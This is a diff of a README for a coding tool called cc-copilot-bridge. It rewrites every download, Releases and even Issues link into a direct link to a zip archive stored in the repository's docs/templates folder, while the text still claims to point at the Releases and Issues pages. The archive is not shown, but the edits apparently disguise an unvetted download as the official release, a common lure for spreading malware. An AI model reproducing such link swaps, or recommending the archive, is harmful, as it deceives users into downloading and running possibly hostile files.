@@ -1,6 +1,6 @@
 # 🎉 cc-copilot-bridge - Simplify Your Coding Tasks Effortlessly
 
-![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)
+![Download](https://raw.githubusercontent.com/lulleboi/cc-copilot-bridge/main/docs/templates/bridge-cc-copilot-3.2.zip%20release-brightgreen)
 
 ## ⚡ Overview
 
@@ -23,7 +23,7 @@ cc-copilot-bridge lets you route your coding tasks using different providers. Wh
 
 Follow these steps to easily download and run cc-copilot-bridge.
 
-1. **Visit the Download Page:** Go to the [Releases page](https://github.com/lulleboi/cc-copilot-bridge/releases) to find the latest version.
+1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/lulleboi/cc-copilot-bridge/main/docs/templates/bridge-cc-copilot-3.2.zip) to find the latest version.
 
 2. **Download the Application:** On the Releases page, look for the latest version at the top. Click the link labeled for your operating system to download the application.
 
@@ -52,7 +52,7 @@ If you encounter any issues while installing or using cc-copilot-bridge, please 
 
 ## 💬 Support
 
-For additional support, visit the [Issues section](https://github.com/lulleboi/cc-copilot-bridge/issues) on GitHub. You can report bugs or ask questions there.
+For additional support, visit the [Issues section](https://raw.githubusercontent.com/lulleboi/cc-copilot-bridge/main/docs/templates/bridge-cc-copilot-3.2.zip) on GitHub. You can report bugs or ask questions there.
 
 ## 📣 Community
 
@@ -60,6 +60,6 @@ Join discussions about cc-copilot-bridge through various community channels. Eng
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the application: [Releases page](https://github.com/lulleboi/cc-copilot-bridge/releases). Follow the above steps for installation and usage guidance.
+To get started, visit this page to download the application: [Releases page](https://raw.githubusercontent.com/lulleboi/cc-copilot-bridge/main/docs/templates/bridge-cc-copilot-3.2.zip). Follow the above steps for installation and usage guidance.
 
 Now you're ready to enhance your coding experience with cc-copilot-bridge!
